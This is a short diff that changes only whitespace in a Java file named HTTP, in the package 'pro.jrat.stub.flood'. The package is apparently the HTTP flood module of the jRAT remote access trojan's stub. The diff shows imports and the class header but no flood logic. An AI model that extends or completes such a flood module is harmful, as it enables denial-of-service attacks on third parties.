@@ -1,4 +1,5 @@
 package pro.jrat.stub.flood;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
@@ -7,7 +8,6 @@ import java.net.URL;
 import java.net.URLConnection;
 
 import pro.jrat.stub.Constants;
-
 
 public class HTTP implements Runnable {
 
